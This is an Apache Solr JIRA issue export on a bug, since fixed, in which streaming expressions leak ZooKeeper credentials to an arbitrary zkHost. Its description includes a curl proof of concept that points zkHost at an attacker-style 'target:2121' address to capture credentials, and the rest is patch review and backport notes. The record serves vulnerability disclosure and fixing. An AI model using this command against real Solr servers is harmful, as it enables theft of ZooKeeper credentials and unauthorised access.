<!-- 
RSS generated by JIRA (8.20.10#820010-sha1:ace47f9899e9ee25d7157d59aa17ab06aee30d3d) at Wed Nov 12 05:09:13 UTC 2025

It is possible to restrict the fields that are returned in this document by specifying the 'field' parameter in your request.
For example, to request only the issue key and summary append 'field=key&field=summary' to the URL of your request.
-->
<rss version="0.92" >
<channel>
    <title>ASF JIRA</title>
    <link>https://issues.apache.org/jira</link>
    <description>This file is an XML representation of an issue</description>
    <language>en-uk</language>    <build-info>
        <version>8.20.10</version>
        <build-number>820010</build-number>
        <build-date>22-06-2022</build-date>
    </build-info>


<item>
            <title>[SOLR-17098] Zookeeper Credential Information Disclosure bug via Streaming Expressions</title>
                <link>https://issues.apache.org/jira/browse/SOLR-17098</link>
                <project id="12310230" key="SOLR">Solr</project>
                    <description>&lt;p&gt;Security list thread: &lt;a href=&quot;https://lists.apache.org/thread/byrxkqk15mh6960wmx4r851srosgkvbh&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://lists.apache.org/thread/byrxkqk15mh6960wmx4r851srosgkvbh&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&#160;&lt;/p&gt;

&lt;p&gt;ZK Credentials and ACLs can be exposed to any endpoint when the Streaming Handler is used:&lt;/p&gt;

&lt;p&gt;&#160;&lt;/p&gt;

&lt;p&gt;&lt;tt&gt;curl --data-urlencode &apos;expr=search(collection1,&lt;/tt&gt;&lt;br/&gt;
&lt;tt&gt;&#160; &#160; &#160; &#160;zkHost=&quot;target:2121&quot;,&lt;/tt&gt;&lt;br/&gt;
&lt;tt&gt;&#160; &#160; &#160; &#160;qt=&quot;/export&quot;,&lt;/tt&gt;&lt;br/&gt;
&lt;tt&gt;&#160; &#160; &#160; &#160;q=&quot;&lt;b&gt;:&lt;/b&gt;&quot;,&lt;/tt&gt;&lt;br/&gt;
&lt;tt&gt;&#160; &#160; &#160; &#160;fl=&quot;id,a_s,a_i,a_f&quot;,&lt;/tt&gt;&lt;br/&gt;
&lt;tt&gt;&#160; &#160; &#160; &#160;sort=&quot;a_f asc, a_i asc&quot;)&apos;&#160;&lt;a href=&quot;http://localhost:8983/solr/demo/stream&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;http://localhost:8983/solr/demo/stream&lt;/a&gt;&lt;/tt&gt;&lt;/p&gt;

&lt;p&gt;&#160;&lt;/p&gt;

&lt;p&gt;In the command above, if the Solr instance has any Zookeeper Credentials or ACLs provided, then that information will be sent to the &quot;target:2121&quot; address. An attacker could set up a mock Zookeeper service to obtain the credentials, and then gain access to the Solr&apos;s Zookeeper Nodes.&lt;/p&gt;</description>
                <environment></environment>
        <key id="13560702">SOLR-17098</key>
            <summary>Zookeeper Credential Information Disclosure bug via Streaming Expressions</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="1" iconUrl="https://issues.apache.org/jira/images/icons/priorities/blocker.svg">Blocker</priority>
                        <status id="6" iconUrl="https://issues.apache.org/jira/images/icons/statuses/closed.png" description="The issue is considered finished, the resolution is correct. Issues which are not closed can be reopened.">Closed</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="1">Fixed</resolution>
                                        <assignee username="houston">Houston Putman</assignee>
                                    <reporter username="houston">Houston Putman</reporter>
                        <labels>
                    </labels>
                <created>Tue, 5 Dec 2023 19:48:15 +0000</created>
                <updated>Fri, 9 Feb 2024 16:43:50 +0000</updated>
                            <resolved>Wed, 10 Jan 2024 23:28:50 +0000</resolved>
                                                    <fixVersion>8.11.3</fixVersion>
                    <fixVersion>9.4.1</fixVersion>
                                    <component>streaming expressions</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>3</watches>
                                                                                                                <comments>
                            <comment id="17793421" author="houston" created="Tue, 5 Dec 2023 20:20:10 +0000"  >&lt;p&gt;Have a patch ready to test out. It works across all uses of the SolrClientCache, so hopefully there won&apos;t be any gaps we need to plugin in the future.&lt;/p&gt;</comment>
                            <comment id="17798812" author="dsmiley" created="Wed, 20 Dec 2023 04:03:38 +0000"  >&lt;p&gt;Thanks for working on this!  Feel free to at-mention me next time.  I would have responded earlier in the month.&lt;br/&gt;
I applied the patch to IntelliJ and also ran the tests via Crave CLI invocation (all passed; 6m 43sec)&lt;/p&gt;
&lt;ul&gt;
	&lt;li&gt;CloudSolrStream: you initialize ignoreZkACLs boolean but never use it (thanks IntelliJ for pointing this out)&lt;/li&gt;
	&lt;li&gt;TupleStream: can remove your only edit; it was just for a newline&lt;/li&gt;
	&lt;li&gt;SolrClientCache: here you used &lt;tt&gt;zkHost::contains&lt;/tt&gt; but shouldn&apos;t this be zkHost::equals ?  Should match the host exactly, not partially.&lt;/li&gt;
&lt;/ul&gt;
</comment>
                            <comment id="17799177" author="houston" created="Wed, 20 Dec 2023 21:28:16 +0000"  >&lt;p&gt;Thanks for finding the first two, removed both as they were from earlier implementations.&lt;/p&gt;

&lt;p&gt;The SolrClientCache used contains to make sure that other chRoots could still use the ACLs, because that&apos;s not a security issue. However yeah contains was the wrong way to do it. I changed it to &quot;equals&quot; after removing chRoots.&lt;/p&gt;

&lt;p&gt;New patch should be good to go?&lt;/p&gt;</comment>
                            <comment id="17799249" author="dsmiley" created="Thu, 21 Dec 2023 04:19:24 +0000"  >&lt;p&gt;This works.  +1&lt;/p&gt;

&lt;p&gt;In retrospect, I don&apos;t love that this approach introduces ignoreZkACLs in a number of places; it takes some review to understand what&apos;s going on and it seems yet another small wrinkle of complexity on things.  It&apos;s an exotic option.&lt;/p&gt;

&lt;p&gt;An alternative approach is to try to isolate the entire change to SolrZkClient.createZkCredentialsToAddAutomatically, where zkCredentialsProvider is loaded and is itself an exotic option as well.  The zkServer would be passed in to that method.  But it&apos;s unclear how that method would know if the zkServer is &lt;b&gt;the&lt;/b&gt; one (or ones?) to which the zkCredentialsProvider applies.  So a half-baked idea.  Maybe it would require whatever the sys prop that identifies ZK being set and equivalent to the arg.&lt;/p&gt;

&lt;p&gt;Perhaps ZkCredentialsInjector&apos;s API (or its collaborator APIs) are missing an argument that ought to be there &amp;#8211; the zkServer.&lt;/p&gt;

&lt;p&gt;Any way I did +1.&lt;/p&gt;</comment>
                            <comment id="17799554" author="houston" created="Thu, 21 Dec 2023 19:52:15 +0000"  >&lt;p&gt;Yeah unfortunately all of the ZkCredentialsInjector stuff is a part of SolrJ-Zookeeper, and thus doesn&apos;t really have any knowledge of the Solr Core&apos;s Zookeeper address. So we&apos;d have to pass through that info anyways.&lt;/p&gt;

&lt;p&gt;I&apos;ll move forward so this won&apos;t block the patch releases, we can always improve it in the future.&lt;/p&gt;</comment>
                            <comment id="17802408" author="dsmiley" created="Thu, 4 Jan 2024 06:35:42 +0000"  >&lt;p&gt;&lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=houston&quot; class=&quot;user-hover&quot; rel=&quot;houston&quot;&gt;houston&lt;/a&gt;, anything needed to get this over the finish line?  This is the only block for 9.4.1&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://issues.apache.org/jira/issues/?jql=project%20%3D%20SOLR%20AND%20resolution%20%3D%20Unresolved%20AND%20fixVersion%20%3D%209.4.1%20%20ORDER%20BY%20priority%20DESC%2C%20updated%20DESC&quot; class=&quot;external-link&quot; rel=&quot;nofollow&quot;&gt;https://issues.apache.org/jira/issues/?jql=project%20%3D%20SOLR%20AND%20resolution%20%3D%20Unresolved%20AND%20fixVersion%20%3D%209.4.1%20%20ORDER%20BY%20priority%20DESC%2C%20updated%20DESC&lt;/a&gt;&lt;/p&gt;</comment>
                            <comment id="17803406" author="houston" created="Fri, 5 Jan 2024 04:48:50 +0000"  >&lt;p&gt;This has been backported to 9.4.1, but it hasn&apos;t been backported to 8.11.3 yet, so it&apos;s not marked as Done.&lt;/p&gt;

&lt;p&gt;You should be good to move forward with 9.4.1&lt;/p&gt;</comment>
                            <comment id="17805321" author="houston" created="Wed, 10 Jan 2024 23:28:50 +0000"  >&lt;p&gt;This has been backported to branch_8_11 now. All backporting should be done.&lt;/p&gt;</comment>
                            <comment id="17808388" author="dsmiley" created="Thu, 18 Jan 2024 22:33:08 +0000"  >&lt;p&gt;Closing after the 9.4.1 release&lt;/p&gt;</comment>
                    </comments>
                    <attachments>
                            <attachment id="13065482" name="SOLR-17098-1.diff" size="26553" author="houston" created="Wed, 20 Dec 2023 21:24:54 +0000"/>
                            <attachment id="13064987" name="SOLR-17098.diff" size="28736" author="houston" created="Tue, 5 Dec 2023 20:19:30 +0000"/>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>2.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            1 year, 42 weeks, 5 days ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z1m2f4:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12313321" key="com.atlassian.jira.toolkit:message">
                        <customfieldname>Solr Mailing List Info</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    </customfields>
    </item>
</channel>
</rss>